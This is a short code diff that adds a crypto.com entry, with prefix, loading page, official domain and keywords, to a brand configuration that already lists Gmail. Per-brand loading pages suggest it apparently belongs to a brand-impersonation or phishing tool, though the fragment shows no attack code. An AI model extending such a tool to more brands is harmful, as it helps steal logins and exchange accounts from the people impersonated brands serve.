@@ -408,6 +408,12 @@ const BRAND_CONFIG = {
         loadingPage: 'gmailloading.html',
         officialDomain: 'mail.google.com',
         keywords: ['gmail', 'google']
+    },
+    'cryptocom': {
+        prefix: 'CRYPTO',
+        loadingPage: 'cryptocomloading.html',
+        officialDomain: 'crypto.com',
+        keywords: ['crypto']
     }
 };
 
